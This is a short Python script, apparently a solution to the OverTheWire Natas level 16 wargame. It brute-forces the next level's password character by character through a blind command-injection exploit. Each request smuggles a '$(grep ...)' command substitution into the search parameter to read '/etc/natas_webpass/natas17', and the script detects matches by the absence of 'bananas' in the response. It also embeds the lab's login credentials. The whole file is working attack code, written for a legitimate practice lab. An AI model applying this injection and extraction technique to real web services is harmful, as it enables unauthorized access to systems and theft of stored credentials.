#!/usr/bin/python

__author__ = "bt3"

import requests
import string


def brute_force_password(LENGTH, AUTH, CHARS, URL1, URL2):

        password = ''

        for i in range(1, LENGTH+1):
            for j in range (len(CHARS)):
                print("Position %d: Trying %s ..." %(i, CHARS[j]))
                r = requests.get( ( URL1 + password + CHARS[j] + URL2  ), auth=AUTH)

                if 'bananas' not in r.text:
                        password += CHARS[j]
                        print("Password so far: " + password)
                        break

        return password



if __name__ == '__main__':

        # authorization: login and password
        AUTH = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')


        # BASE64 password and 32 bytes
        CHARS = string.ascii_letters + string.digits
        LENGTH = 32


        # crafted url
        URL1 = 'http://natas16.natas.labs.overthewire.org?needle=$(grep -E ^'
        URL2 = '.* /etc/natas_webpass/natas17)banana&submit=Search'


        print(brute_force_password(LENGTH, AUTH, CHARS, URL1, URL2))

